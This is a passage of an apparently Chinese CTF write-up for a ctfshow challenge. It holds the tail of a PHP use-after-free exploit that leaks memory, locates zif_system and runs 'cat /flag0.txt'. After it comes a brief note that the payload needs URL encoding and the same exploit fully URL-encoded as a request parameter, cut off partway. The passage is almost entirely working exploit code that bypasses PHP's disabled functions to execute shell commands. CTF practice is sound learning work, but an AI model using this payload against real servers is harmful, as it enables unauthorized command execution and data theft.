<span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br> <br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br> <br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br> <br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br> <br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br> <br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br> <br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">56</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">75</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">77</span>%<span class="hljs-number">20</span>%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">54</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">31</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">5</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">67</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">48</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">62</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">32</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">26</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">2</span>d%<span class="hljs-number">2</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">64</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span 